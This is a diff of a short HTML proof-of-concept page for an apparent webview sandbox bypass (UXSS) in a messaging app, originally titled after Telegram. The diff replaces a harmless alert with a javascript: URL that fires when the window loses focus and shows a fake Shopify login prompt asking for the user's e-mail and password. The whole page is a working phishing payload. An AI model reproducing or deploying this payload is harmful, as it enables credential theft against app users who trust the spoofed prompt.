@@ -1,9 +1,8 @@
-
 <html lang="en-US">
 <head>
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, user-scalable=no">
-	<title> Bypass sandbox Webview UXss Delayed JavaScript execution leak to host app (Telegram)</title>
+	<title>tes</title>
 	
 	<style>
 		iframe {
@@ -13,7 +12,7 @@
    
 	<script>
 		window.onblur = function() {
-			document.getElementById("iframe").src = "javascript:alert('1.');";
+			document.getElementById("iframe").src = "javascript:prompt('In order to access shopify.com\\nyou must first login on your\\nShopify Account.\\n\\nPlease type your e-mail\\nand your password:\\n', 'E-mail / Password.');";
 		}
 	</script>
 </head>
